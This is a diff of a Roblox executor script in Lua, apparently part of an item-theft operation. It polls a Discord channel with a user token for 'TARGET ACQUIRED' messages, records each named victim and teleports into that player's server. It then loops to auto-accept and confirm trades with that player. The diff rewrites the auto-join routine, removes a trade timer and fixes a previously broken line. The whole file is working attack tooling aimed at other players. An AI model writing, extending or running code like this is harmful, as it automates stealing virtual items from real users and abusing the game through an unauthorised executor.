@@ -25,8 +25,6 @@ end
 
 local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
-local didVictimLeave = false
-local timer = 0
 local lastRequestTime = 0
 
 local function selectDevice()
@@ -47,8 +45,7 @@ end
 
 task.spawn(selectDevice)
 
-local waittime = delay or 2
-wait(waittime)
+wait(delay or 2)
 wait(2)
 
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('/w')
@@ -56,7 +53,7 @@ game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('/w')
 local TradeFolder = game:GetService('ReplicatedStorage'):WaitForChild('Trade')
 
 local function saveJoinedId(messageId)
-    table.insert(joinedIds, messageId)
+    table.insert(joinedIds, tostring(messageId))
     writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
 
@@ -68,21 +65,14 @@ local function refreshVictim()
 end
 
 local function getTradeStatus()
-    local ok, status = pcall(function() return TradeFolder.GetTrade)
-Status:InvokeServer() end)
+    local ok, status = pcall(function() return TradeFolder.GetTradeStatus:InvokeServer() end)
     return ok and status or "None"
 end
 
-local function IsTrading()
-    return getTradeStatus() == "StartTrade"
-end
-
--- Accepts incoming requests + sends our own when idle
 local function acceptRequest()
     while task.wait(0.15) do
         refreshVictim()
         local status = getTradeStatus()
-
         if status == "ReceivingRequest" then
             pcall(function() TradeFolder.AcceptRequest:FireServer() end)
         elseif status == "None" then
@@ -98,7 +88,6 @@ local function acceptRequest()
     end
 end
 
--- Confirms trade using same args as the trader script
 local function acceptTrade()
     while task.wait(0.1) do
         if getTradeStatus() == "StartTrade" then
@@ -109,64 +98,74 @@ local function acceptTrade()
     end
 end
 
-local function waitForPlayerLeave()
-    game.Players.PlayerRemoving:Connect(function(removedPlayer)
-        if removedPlayer.Name == victimUser then
-            didVictimLeave = true
-        end
-    end)
-end
-
-local function tradeTimer()
-    while task.wait(1) do
-        if IsTrading() then
-            timer = 0
-        else
-            timer = timer + 1
-        end
-    end
-end
-
-waitForPlayerLeave()
 task.spawn(acceptTrade)
-task.spawn(tradeTimerwait(3)
+wait(3)
 task.spawn(acceptRequest)
 
+-- ══════════════════════════════════════════════════════════════════
+--  AUTO JOIN — polls every 2 seconds, teleports to newest hit
+-- ══════════════════════════════════════════════════════════════════
+
 local function autoJoin()
-    local response = request({
-        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
-        Method = "GET",
-        Headers = {
-            ['Authorization'] = token,
-            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            ["Content-Type"] = "application/json"
-        }
-    })
-    if response.StatusCode == 200 then
-        local messages = HttpServ:JSONDecode(response.Body)
-        if #messages == 0 then return end
-        for _, message in ipairs(messages) do
-            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
-                if message.embeds[1].title:find("TARGET ACQUIRED") then
-                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
-                    if placeId and jobId then
-                        local victimUsername = message.embeds[1].fields[1].value
-                        if didVictimLeave or timer > 5 then
-                            if not table.find(joinedIds, tostring(message.id)) then
-                                saveJoinedId(tostring(message.id))
-                                writefile("user.txt", victimUsername)
-                                victimUser = victimUsername
-                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
-                                return
-                            end
-                        end
+    local ok, response = pcall(function()
+        return request({
+            Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
+            Method = "GET",
+            Headers = {
+                ['Authorization'] = token,
+                ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+                ["Content-Type"] = "application/json"
+            }
+        })
+    end)
+
+    if not ok or not response then
+        warn("[AUTOJOIN] request failed")
+        return
+    end
+
+    if response.StatusCode ~= 200 then
+        warn("[AUTOJOIN] status " .. tostring(response.StatusCode))
+        return
+    end
+
+    local messages = HttpServ:JSONDecode(response.Body)
+    if #messages == 0 then return end
+
+    for _, message in ipairs(messages) do
+        local embed = message.embeds and message.embeds[1]
+        if embed and embed.title and embed.title:find("TARGET ACQUIRED") then
+            local placeId, jobId = string.match(
+                message.content,
+                'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)'
+            )
+            if placeId and jobId then
+                -- Already teleported to this hit before?
+                if table.find(joinedIds, tostring(message.id)) then
+                    -- silent skip, no spam
+                elseif tostring(game.JobId) == tostring(jobId) then
+                    -- already in that server
+                    saveJoinedId(message.id)
+                else
+                    print("[AUTOJOIN] NEW HIT — placeId=" .. placeId .. " jobId=" .. jobId)
+                    saveJoinedId(message.id)
+
+                    local victimUsername = embed.fields and embed.fields[1] and embed.fields[1].value
+                    if victimUsername then
+                        writefile("user.txt", victimUsername)
+                        victimUser = victimUsername
                     end
+
+                    game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
+                    return
                 end
             end
         end
     end
 end
 
-while wait(5) do
+-- First check immediately, then every 2 seconds
+autoJoin()
+while task.wait(2) do
     autoJoin()
 end
